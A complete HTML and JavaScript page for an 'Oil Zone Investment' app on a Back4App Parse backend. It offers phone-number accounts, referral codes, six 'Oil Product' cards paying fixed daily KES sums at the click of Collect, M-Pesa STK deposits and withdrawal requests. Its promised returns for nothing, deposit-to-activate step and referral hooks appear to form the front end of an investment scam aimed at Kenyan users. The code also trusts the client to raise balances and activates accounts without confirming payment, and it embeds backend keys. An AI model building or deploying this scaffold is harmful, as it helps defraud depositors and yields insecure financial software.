<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Oil Zone Investment</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/parse/3.4.4/parse.min.js"></script>
<script>
Parse.initialize(
 "eP6iUjmtNrg7SEqtwBkaNLUxtuGEHGk1TYBRz2Ck",
 "7v1nDUEFTO6WcYFRwjXncGJZOMbahhuLE9KKFMw3"
);
Parse.serverURL="https://parseapi.back4app.com/";
</script>

<style>
body{font-family:Arial;background:#0f9b8e}
.container{max-width:420px;margin:30px auto;background:#fff;padding:20px;border-radius:15px}
input,button{width:100%;padding:14px;margin:8px 0;border-radius:25px}
button{background:#2196f3;color:#fff;border:none}
.collect-orange{background:orange}
.section{display:none}.active{display:block}
nav{position:fixed;bottom:0;left:0;right:0;display:none;background:#fff}
nav button{flex:1;background:none;color:#000}
.product{border:1px solid #ddd;padding:15px;margin:10px 0;border-radius:12px}
</style>
</head>

<body>

<div class="container" id="auth">
<h3 id="authTitle">Login</h3>
<input id="phone" placeholder="+2547XXXXXXXX">
<input id="password" type="password" placeholder="Password">
<input id="confirm" type="password" placeholder="Confirm Password" style="display:none">
<input id="referralInput" placeholder="Referral Code (optional)" style="display:none">
<button id="loginBtn" onclick="login()">Login</button>
<button id="registerBtn" onclick="register()" style="display:none">Register</button>
<p onclick="switchAuth()" style="text-align:center;cursor:pointer" id="switchText">Register</p>
</div>

<div class="container section" id="products">
<h3>Products</h3>
<div id="productList"></div>
</div>

<div class="container section" id="wallet">
<h3>Wallet</h3>
<p>Balance: <b id="balance">KES 0</b></p>
<button onclick="deposit()">Deposit</button>
<button onclick="withdraw()">Withdraw</button>
</div>

<nav id="nav">
<button onclick="show('products')">Products</button>
<button onclick="show('wallet')">Wallet</button>
<button onclick="logout()">Logout</button>
</nav>

<script>
let walletObj,isRegister=false;

function switchAuth(){
 isRegister=!isRegister;
 confirm.style.display=isRegister?"block":"none";
 referralInput.style.display=isRegister?"block":"none";
 loginBtn.style.display=isRegister?"none":"block";
 registerBtn.style.display=isRegister?"block":"none";
 authTitle.innerText=isRegister?"Register":"Login";
}

function show(id){
 document.querySelectorAll(".section").forEach(s=>s.classList.remove("active"));
 document.getElementById(id).classList.add("active");
}

async function register(){
 const phoneNum=phone.value.replace(/\D/g,'');
 if(password.value!==confirm.value) return alert("Passwords mismatch");

 const user=new Parse.User();
 user.set("username",phoneNum);
 user.set("password",password.value);
 user.set("referralCode","OZ"+Math.floor(Math.random()*100000));
 user.set("invited",referralInput.value?true:false);
 await user.signUp();
 alert("Account created");
 switchAuth();
}

async function login(){
 await Parse.User.logIn(phone.value.replace(/\D/g,''),password.value);
 auth.style.display="none";
 nav.style.display="flex";
 await loadWallet();
 generateProducts();
 show("products");
}

async function loadWallet(){
 const Wallet=Parse.Object.extend("Wallet");
 const q=new Parse.Query(Wallet);
 q.equalTo("user",Parse.User.current());
 walletObj=await q.first();
 if(!walletObj){
   walletObj=new Wallet();
   walletObj.set("user",Parse.User.current());
   walletObj.set("balance",0);
   walletObj.set("activated",Parse.User.current().get("invited"));
   await walletObj.save();
 }
 balance.innerText="KES "+walletObj.get("balance");
}

function generateProducts(){
 productList.innerHTML="";
 const activated=walletObj.get("activated");
 for(let i=1;i<=6;i++){
  let daily=i*100;
  productList.innerHTML+=`
  <div class="product">
   <b>Oil Product ${i}</b>
   <p>Daily: ${daily}</p>
   <button class="${activated?'collect-orange':''}"
    onclick="${activated?`collect(${i},${daily})`:'alert("Activate account")'}">
    Collect
   </button>
  </div>`;
 }
}

async function collect(pid,amt){
 const today=new Date().toDateString();
 if(walletObj.get("last_"+pid)===today) return alert("Already collected");
 walletObj.increment("balance",amt);
 walletObj.set("last_"+pid,today);
 await walletObj.save();
 balance.innerText="KES "+walletObj.get("balance");
}

async function deposit(){
 const amt=parseInt(prompt("Amount"));
 await Parse.Cloud.run("stkPush",{phone:Parse.User.current().get("username"),amount:amt});
 walletObj.set("activated",true); // ðŸ”¥ AUTO ACTIVATE
 await walletObj.save();
 alert("STK sent. Account activated.");
 generateProducts();
}

async function withdraw(){
 const amt=parseInt(prompt("Amount"));
 const W=Parse.Object.extend("Withdrawals");
 const w=new W();
 w.set("user",Parse.User.current());
 w.set("amount",amt);
 w.set("status","pending");
 await w.save();
 alert("Withdrawal request sent");
}

async function logout(){
 await Parse.User.logOut();
 location.reload();
}
</script>
</body>
</html>